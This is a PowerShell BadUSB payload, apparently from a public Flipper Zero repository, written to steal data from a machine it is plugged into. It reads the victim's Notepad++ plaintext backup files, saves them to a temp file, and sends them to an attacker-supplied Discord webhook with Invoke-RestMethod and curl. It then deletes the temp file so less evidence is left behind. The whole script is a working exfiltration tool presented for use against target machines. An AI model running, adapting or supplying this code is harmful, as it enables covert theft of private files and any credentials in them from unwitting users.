<#
.SYNOPSIS
    Name: f0-np-plus-plus-snoopy.ps1
    The purpose of this script is to read and export information which may be held in NotePad++ backups.

.DESCRIPTION
    This script is designed to work in conjunction with "SnoopPlusPlus.txt" to extract the information from NotePad++ backups using FlipperZero.
    Backups are stored in plaintext at C:\Users\<USERNAME>\AppData\Roaming\NotePad++\backup.
    This script will read the backup contents, export them to a file in the user temp directory and then upload them to your
    Dropbox if you provide a valid API key.

.NOTES
    Version:    0.2

    Author:     Contrxl

    Updated:    05/06/2024      -First version of standalone script.
                06/06/2024      -Changed exfil method to Discord over DropBox.
                                -Added cleanup at end to remove created Temp file.

.LINK 
    https://github.com/contrxl/flipper-stuff/tree/main/badusb

.EXAMPLE
    To run this as intended with FlipperZero:
        - Take a copy of "SnoopPlusPlus.txt"
        - Insert your Discord Webhook URL in the $dc variable.
        - Upload "SnoopPlusPlus.txt" to your FlipperZero in the SDCard/badusb/ folder.
        - Connect FlipperZero to target machine and run "SnoopPlusPlus.txt" from badusb.
#>

$FileName = "$ENV:tmp/$ENV:USERNAME-NPPlusData-$(Get-Date -f hh-mm_dd-MM-yyyy).txt"

$appdataroaming = $ENV:APPDATA
$toread = "Notepad++\backup"
$fullpath = Join-Path -Path $appdataroaming -ChildPath $toread
$filelist = Get-ChildItem $fullpath\*@*

function Get-backupContents{
    <#
    .SYNOPSIS
        This function reads the contents of the stored NotePad++ backups, currently there is no action taken if no backups are present.

    .NOTES
        To do: 
            - Add error or output message indicating that no backups could be found or accessed. Currently it will export a blank file.
    #>
    $backupcontents = ForEach ($filepath in $filelist)
    {
        $filecontent = Get-Content -Path $filepath
        [pscustomobject]@{
            'FileContent:' = $filecontent
        }
    }
    return $backupcontents
}

# Backup contents need to be converted to Json format before they can be correctly exported to a text file.
$backupcontents = Get-backupContents
$out = ConvertTo-Json $backupcontents
$out > $FileName 

<#
.SYNOPSIS
    This function uploads the collected data to your Discord channel when an API key is provided as $dc.
#>
function exfilDiscord {
    [CmdletBinding()]
    param(
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text
    )

    $webHook = "$dc"

    $body = @{
        'username' = $ENV:USERNAME
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webHook -Method Post -Body ($body | ConvertTo-Json)};

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $webHook
    }
}

# Checks the $dc value is not empty, and if so, sends the file to Discord.
if (-not ([string]::IsNullOrEmpty($dc))){
    exfilDiscord -file $FileName
}

# Clean up Temp file created.
Remove-Item $FileName